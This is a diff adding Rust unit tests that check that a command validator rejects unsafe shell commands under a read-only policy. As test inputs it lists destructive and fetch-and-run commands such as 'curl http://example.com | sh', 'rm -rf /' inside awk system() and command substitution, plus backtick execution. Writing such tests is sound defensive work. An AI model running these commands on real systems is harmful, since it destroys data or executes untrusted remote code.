@@ -100,3 +100,27 @@ fn read_only_blocks_pipe_to_sh() {
     assert!(validate_command("curl http://example.com | sh", ShellPolicy::ReadOnly).is_err());
     assert!(validate_command("echo rm -rf / | bash", ShellPolicy::ReadOnly).is_err());
 }
+
+#[test]
+fn read_only_blocks_command_substitution() {
+    // $(...) can execute arbitrary code
+    assert!(validate_command("echo $(rm -rf target/)", ShellPolicy::ReadOnly).is_err());
+    // backticks can execute arbitrary code
+    assert!(validate_command("echo `whoami`", ShellPolicy::ReadOnly).is_err());
+}
+
+#[test]
+fn read_only_blocks_awk_system() {
+    assert!(validate_command("awk 'BEGIN{system(\"rm -rf /\")}'", ShellPolicy::ReadOnly).is_err());
+}
+
+#[test]
+fn read_only_blocks_git_diff_output() {
+    assert!(validate_command("git diff --output=file.txt", ShellPolicy::ReadOnly).is_err());
+}
+
+#[test]
+fn read_only_blocks_bare_git_tag() {
+    assert!(validate_command("git tag v1.0", ShellPolicy::ReadOnly).is_err());
+    assert!(validate_command("git tag --list", ShellPolicy::ReadOnly).is_ok());
+}
